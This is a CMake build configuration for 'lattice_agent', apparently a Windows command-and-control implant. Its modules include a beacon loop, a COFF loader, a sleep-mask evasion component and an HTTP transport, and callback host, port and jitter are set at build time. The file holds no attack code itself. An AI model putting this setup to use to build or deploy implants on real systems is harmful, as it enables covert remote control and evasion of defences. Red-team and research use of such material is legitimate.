cmake_minimum_required(VERSION 3.20)
project(lattice_agent C)

if(NOT WIN32)
    message(FATAL_ERROR "Lattice agent targets Windows only.")
endif()

set(CMAKE_C_STANDARD 11)

# No CRT: position-independent, no default libs.
# /GS- disables buffer security checks (stack cookie requires CRT init).
# /Gy enables function-level linking for dead-code elimination.
# /Zl omits the default library name from the OBJ (keeps PE clean).
set(CMAKE_C_FLAGS "${CMAKE_C_FLAGS} /GS- /Gy /Zl /W3")

# Transport PICO: swap this source to change transport without touching other modules.
set(TRANSPORT_SRC src/transport/http_transport.c)

add_executable(lattice_agent
    src/core/loop.c
    src/core/dispatcher.c
    src/core/coff_loader.c
    src/opsec/sleep_mask.c
    ${TRANSPORT_SRC}
)

target_include_directories(lattice_agent PRIVATE include)

# Link only what we actually need; no CRT.
target_link_libraries(lattice_agent PRIVATE
    winhttp.lib
    kernel32.lib
    ntdll.lib
)

# Link options: no CRT entry point, use our own.
# /ENTRY:lattice_run makes the PE entry point our comms loop directly.
# In a real PICO build this would be replaced by the Crystal Palace linker script.
set_target_properties(lattice_agent PROPERTIES
    LINK_FLAGS "/NODEFAULTLIB /ENTRY:lattice_run"
)

# Compiler definitions for profile injection at build time.
# Override these via: cmake -DLATTICE_HOST=... -DLATTICE_PORT=...
target_compile_definitions(lattice_agent PRIVATE
    "LATTICE_HOST=L\"127.0.0.1\""
    "LATTICE_PORT=443"
    "LATTICE_SLEEP_MS=60000"
    "LATTICE_JITTER_PCT=15"
)
